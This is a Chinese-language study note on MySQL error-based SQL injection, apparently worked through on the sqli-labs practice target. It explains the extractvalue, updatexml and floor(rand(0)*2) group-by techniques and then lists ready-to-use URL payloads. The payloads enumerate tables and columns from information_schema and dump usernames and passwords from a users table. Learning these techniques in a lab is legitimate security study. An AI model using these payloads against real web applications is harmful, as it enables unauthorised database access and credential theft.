## SQL注入之报错注入（有一定局限性，回显的内容不是特别多）



简介：

![Screenshot_20251222_185357_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20251222_185357_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)

![Screenshot_20251222_185558_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20251222_185558_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)

![Screenshot_20251222_185715_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20251222_185715_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)





下面我们简单演示一下

![image-20251222190040466](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222190040466.png)

![image-20251222190124120](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222190124120.png)

我们能看到，命令正常执行了，但就是不给回显，所以我们尝试使用报错注入拿到更多信息

![image-20251222190307891](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222190307891.png)

我们故意写错引发报错，就能看到当前的数据库为  security





报错注入有很多种

![Screenshot_20251222_191928_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20251222_191928_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)

我们这里详细介绍前三个

###### 其中floor报错最难，也要重点掌握



### 一.  extractvalue  报错注入

函数  extractValue（）包含两个参数

第一个参数    XML文档对象名称 ，第二个参数    路径



我们先在本地部署一下环境，了解一下原理。

第一第二步内容看图：

![Screenshot_20251222_192334_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20251222_192334_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)

![image-20251222193726248](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222193726248.png)





###### 3.使用extractvalue查询xml里面的内容

查询作者是谁 ： select extractvalue(doc,'/book/author/surname') from xml;

![image-20251222194047177](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222194047177.png)

查询书名：select extractvalue(doc,'/book/title') from xml;  

![image-20251222194358602](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222194358602.png)





###### 4.触发报错

（1.  把查询路径写错，如    select extractvalue(doc,'/book/author/surnameeeeeeee') from xml;

​         此时查不到内容，但不会报错

（2. 把查询参数格式符号写错，如    select extractvalue(doc,'~~~~book/title') from xml;  

![image-20251222194844780](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222194844780.png)

我们就可以利用报错，下面我们构造命令

select extractvalue(doc,concat(0x7e,(select database()))) from xml;    一定要留意括号数量

![image-20251222195248520](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222195248520.png)

就可以看到我们的数据库名称 ctfstu 

解析：

![image-20251222200809408](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222200809408.png)

###### concat() 是 MySQL 中的一个字符串拼接函数，它的作用就是把多个字符串连接成一个字符串。





##### 利用extractvalue（）报错注入  less-5

?id=1' union select 1,2,extractvalue(1,concat(0x7e,(select database()))) --+

也可以用    ?id=1' and 1=extractvalue(1,concat(0x70,(select database())))  --+

![image-20251222204705914](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222204705914.png)



之后我们尝试去获取所需数据表名users

?id=1' union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+

![image-20251222205340861](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222205340861.png)



之后我们获取users表里面的列名username和password

?id=1' union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))) --+

![image-20251222205620004](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222205620004.png)



最后查询我们想要的内容

?id=1' union select 1,2,extractvalue(1,concat(0x70,(select group_concat(username,'~',password) from users))) --+

![image-20251222205953575](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222205953575.png)

默认只能返回32个字符

###### 使用函数 substring 解决只能返回32个字符串的问题

?id=1' union select 1,2,extractvalue(1,concat(0x70,(select substring(group_concat(username,'~',password),25,30) from users))) --+

从25个字符后再往后显示30个字符

![image-20251222210546169](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251222210546169.png)







### 二. updatexml  报错注入 （和extractvalue十分相似）

![Screenshot_20251223_180607_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20251223_180607_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)



之后就是熟悉的步骤

先查表名：

?id=1" and 1=updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) --+

![image-20251223181725585](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251223181725585.png)

再查询列名：

?id=1" and 1=updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')),3) --+

![image-20251223182333398](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251223182333398.png)

最后查询用户名和密码：

?id=1" and 1=updatexml(1,concat('~',(select group_concat(username,'~',password) from users)),3) --+

![image-20251223182952464](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251223182952464.png)

?id=1" and 1=updatexml(1,concat('~',(select substring(group_concat(username,'~',password),30,30) from users)),3) --+

![image-20251223184149190](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251223184149190.png)





###### 知识点回顾：

###### 1.判断字符类型（及其闭合方式） /  数字型

###### 2.靶机用户名密码存放位置的表名和列名

数据库 information_schema 中的数据表 tables 下数据列 table_name 和 数据表 columns 下数据列 column_name

###### 3.函数

database（）    数据库库名

group_concat()         把查询目标放同一行显示

concat（）     合并字符

substring（），00,30       从第00个字符开始显示30个字符

###### 4.报错注入函数

extractvalue （XML_document,XPath_string)

updatexml（XML_document,XPath_string,new_value)







#### 

### 三. floor报错（难点）



###### 优点：一行限定输出的字符扩展为64个



![Screenshot_20251224_214158_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20251224_214158_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)





#### 1.  rand（）函数

![image-20251224214516199](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251224214516199.png)

select rand();      计算结果在  0到1  之间

select rand()*2;     计算结果在  0到2  之间

select rand()*2 from users;     根据表 users 的行数随机显示结果 ， 有多少行就显示多少次

![image-20251224215034833](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251224215034833.png)







#### 2.  floor()  函数  ：  小数向下取整数

select floor(rand()*2);           结果随机为  0或者1

select floor(rand()*2) from information_schema.tables; 

![image-20251224215504890](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251224215504890.png)







#### 3.  concat_ws() 函数：将括号内数据用第一个字段连接起来

select concat_ws('~',    (select database())    ,    floor(rand()*2)   ) from users;

![image-20251225183013087](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251225183013087.png)





#### 4.  as 别名  ， group by 分组

select concat_ws('~',    (select database())    ,    floor(rand()*2)   ) as a from users group by a;  (注意和上一张图片进行对比)

![image-20251224220512400](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251224220512400.png)





#### 5. count 函数  ：汇总统计数量

select count( * ) ,concat_ws('~',    (select database())    ,    floor(rand()*2)   ) as a from users group by a;

我们想让他报错，可以发现他偶尔会报错，偶尔不会

![image-20251224221238818](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251224221238818.png)

![image-20251224221323223](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251224221323223.png)





#### 报错原理（难点）

select floor(rand()*2) from users;           结果随机为  0或者1

select floor(rand(0)*2) from users;            计算不再随机，而是按照一定顺序排列，无论刷新多少次都不变

![image-20251225110336115](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251225110336115.png)

所以一旦报错就会永久性报错，不报错就不会

select count( * ) ,concat_ws('~',    (select database())    ,    floor(rand(0)*2)   ) as a from users group by a;         固定报错

select count( * ) ,concat_ws('~',    (select database())    ,    floor(rand(1)*2)   ) as a from users group by a;         固定不报错

原理：

![Screenshot_20251225_111211_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20251225_111211_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)

![Screenshot_20251225_183835_tv_danmaku_bili_UnitedBizDetailsActivity](D:\Huawei Share\Huawei Share\Screenshot_20251225_183835_tv_danmaku_bili_UnitedBizDetailsActivity.jpg)

详细可以看视频

所以可以构造命令：

select count( * ) ,concat_ws('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)) as a from users group by a; 

作用：让rand（） 产生足够多次数的计算

![image-20251225112924084](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251225112924084.png)





下面进入实战



?id=1' union select 1,count( * ),concat_ws('~',(select database()),floor(rand(0)*2)) as a from information_schema.tables group by a --+

![image-20251225113903972](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251225113903972.png)



?id=1' union select 1,count( * ),concat_ws('~',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),floor(rand(0)*2)) as a from information_schema.tables group by a --+

![image-20251225114406664](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251225114406664.png)



?id=1' union select 1,count( * ),concat_ws('~',(select group_concat(username,'-',password) from users,floor(rand(0)*2)) as a from information_schema.tables group by a --+

![image-20251225114931157](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251225114931157.png)

我们能看到查询没有结果，使用group_concat无法显示，可以尝试 concat



?id=1' union select 1,count( * ),concat_ws('~',(select concat(username,'-',password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a --+

limit 0,1  表示从0开始显示第1行

![image-20251225115307785](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20251225115307785.png)